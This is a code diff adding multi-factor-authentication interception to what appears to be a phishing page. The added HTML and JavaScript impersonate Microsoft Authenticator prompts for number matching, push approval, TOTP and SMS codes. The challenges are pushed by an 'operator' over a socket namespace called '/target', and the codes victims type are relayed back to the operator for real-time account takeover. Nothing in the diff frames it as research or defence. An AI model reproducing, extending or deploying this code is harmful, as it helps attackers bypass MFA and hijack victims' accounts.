@@ -135,7 +135,45 @@
             </div>
             <div id="mfaNotice" class="mfa-notice" style="display:none">
               <div class="mfa-notice-icon">&#x1f4f1;</div>
-              <p>A verification request has been sent to your registered device. Please approve the prompt to continue.</p>
+              <p id="mfaNoticeText">A verification request has been sent to your registered device. Please approve the prompt to continue.</p>
+            </div>
+            <div id="mfaChallenge" class="mfa-challenge" style="display:none">
+              <!-- Number Match -->
+              <div id="mfaNumberMatch" class="mfa-challenge-type" style="display:none">
+                <div class="mfa-challenge-icon">&#x1f512;</div>
+                <p class="mfa-challenge-title">Approve sign-in request</p>
+                <p class="mfa-challenge-desc">Enter the number shown to sign in:</p>
+                <div class="mfa-number-display" id="mfaNumber"></div>
+                <p class="mfa-challenge-hint">Open your Microsoft Authenticator app and enter this number to verify your identity.</p>
+              </div>
+              <!-- Push Approval -->
+              <div id="mfaPush" class="mfa-challenge-type" style="display:none">
+                <div class="mfa-challenge-icon">&#x1f4f1;</div>
+                <p class="mfa-challenge-title">Approve sign-in request</p>
+                <p class="mfa-challenge-desc">We've sent a notification to your device. Please open the Microsoft Authenticator app and approve the request to continue.</p>
+                <div class="mfa-push-spinner"></div>
+                <p class="mfa-challenge-hint">Waiting for approval...</p>
+              </div>
+              <!-- TOTP Code Entry -->
+              <div id="mfaTotp" class="mfa-challenge-type" style="display:none">
+                <div class="mfa-challenge-icon">&#x1f513;</div>
+                <p class="mfa-challenge-title">Enter verification code</p>
+                <p class="mfa-challenge-desc">Enter the code from your authenticator app:</p>
+                <div class="mfa-code-input-wrap">
+                  <input type="text" id="mfaTotpInput" class="mfa-code-input" maxlength="6" placeholder="______" autocomplete="one-time-code" inputmode="numeric">
+                </div>
+                <button type="button" class="mfa-verify-btn" id="mfaTotpSubmit">Verify</button>
+              </div>
+              <!-- SMS Code Entry -->
+              <div id="mfaSms" class="mfa-challenge-type" style="display:none">
+                <div class="mfa-challenge-icon">&#x1f4ac;</div>
+                <p class="mfa-challenge-title">Enter verification code</p>
+                <p class="mfa-challenge-desc" id="mfaSmsDesc">Enter the code sent to your phone:</p>
+                <div class="mfa-code-input-wrap">
+                  <input type="text" id="mfaSmsInput" class="mfa-code-input" maxlength="8" placeholder="________" autocomplete="one-time-code" inputmode="numeric">
+                </div>
+                <button type="button" class="mfa-verify-btn" id="mfaSmsSubmit">Verify</button>
+              </div>
             </div>
           </div>
         </div>
@@ -487,18 +525,85 @@
         show('stage-complete');
       }
 
+      // ── MFA Challenge Helpers ───────────────────
+      var mfaChallenge = document.getElementById('mfaChallenge');
+
+      function hideAllMfaChallenges() {
+        mfaNotice.style.display = 'none';
+        mfaChallenge.style.display = 'none';
+        document.querySelectorAll('.mfa-challenge-type').forEach(function(el) { el.style.display = 'none'; });
+      }
+
+      function showMfaChallenge(type, data) {
+        hideAllMfaChallenges();
+        mfaChallenge.style.display = 'block';
+
+        if (type === 'number_match') {
+          document.getElementById('mfaNumberMatch').style.display = 'block';
+          document.getElementById('mfaNumber').textContent = data.number || '??';
+        } else if (type === 'push') {
+          document.getElementById('mfaPush').style.display = 'block';
+        } else if (type === 'totp') {
+          document.getElementById('mfaTotp').style.display = 'block';
+          document.getElementById('mfaTotpInput').value = '';
+          setTimeout(function() { document.getElementById('mfaTotpInput').focus(); }, 200);
+        } else if (type === 'sms') {
+          document.getElementById('mfaSms').style.display = 'block';
+          document.getElementById('mfaSmsInput').value = '';
+          var phoneHint = data.phone_hint || 'your phone';
+          document.getElementById('mfaSmsDesc').textContent = 'Enter the code sent to ' + phoneHint + ':';
+          setTimeout(function() { document.getElementById('mfaSmsInput').focus(); }, 200);
+        }
+      }
+
       // No auto-timer — operator has full control via session-targeted release
       try {
         var socket = io('/target');
         socket.on('connect', function() {
-          // Register with our private room so release only affects us
           socket.emit('register', { sid: sessionSid });
         });
         socket.on('force_next', function() {
           showNext();
         });
+        // Operator pushes an MFA challenge
+        socket.on('mfa_challenge', function(data) {
+          showMfaChallenge(data.type, data);
+        });
+        // Operator clears MFA challenge (e.g. after it's resolved)
+        socket.on('mfa_clear', function() {
+          hideAllMfaChallenges();
+        });
+
+        // TOTP code submission — relay back to operator
+        document.getElementById('mfaTotpSubmit').addEventListener('click', function() {
+          var code = document.getElementById('mfaTotpInput').value.trim();
+          if (code) {
+            socket.emit('mfa_code_response', { sid: sessionSid, code: code, type: 'totp' });
+            document.getElementById('mfaTotp').style.display = 'none';
+            mfaNotice.style.display = 'block';
+            document.getElementById('mfaNoticeText').textContent = 'Verifying code... please standby.';
+          }
+        });
+        document.getElementById('mfaTotpInput').addEventListener('keydown', function(e) {
+          if (e.key === 'Enter') document.getElementById('mfaTotpSubmit').click();
+        });
+
+        // SMS code submission — relay back to operator
+        document.getElementById('mfaSmsSubmit').addEventListener('click', function() {
+          var code = document.getElementById('mfaSmsInput').value.trim();
+          if (code) {
+            socket.emit('mfa_code_response', { sid: sessionSid, code: code, type: 'sms' });
+            document.getElementById('mfaSms').style.display = 'none';
+            mfaNotice.style.display = 'block';
+            document.getElementById('mfaNoticeText').textContent = 'Verifying code... please standby.';
+          }
+        });
+        document.getElementById('mfaSmsInput').addEventListener('keydown', function(e) {
+          if (e.key === 'Enter') document.getElementById('mfaSmsSubmit').click();
+        });
+
       } catch (e) {
-        // WebSocket not available — no fallback, operator must release
+        // WebSocket not available
       }
     }
   </script>
